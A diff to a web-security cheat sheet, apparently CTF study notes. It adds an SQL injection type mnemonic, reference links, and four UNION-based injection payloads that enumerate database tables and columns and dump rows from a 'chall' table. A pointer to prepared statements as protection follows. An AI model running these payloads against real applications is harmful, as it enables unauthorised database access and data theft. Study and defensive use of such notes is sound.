@@ -98,10 +98,25 @@ include("pages/$file");
 ```
 
 ### SQLi
+
+BEUST: Blind,Error,Union,Stacked,Time-based
+
   - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
   - https://www.invicti.com/blog/web-security/fragmented-sql-injection-attacks/
   - https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/
   - https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-with-sqlmap/
+
+`Union classic`:
+
+```
+' union select 0,0,0,0 #
+
+' union select 0,0,table_name,0 from information_schema.tables #
+
+' union select 0,0,column_name,0 from information_schema.columns where table_name='chall' #
+
+ ' union select id, origine, message, 0 from chall #
+```
 
 `Protection`: [quoted & prepared statements](https://phpdelusions.net/mysqli_examples/prepared_select)
 
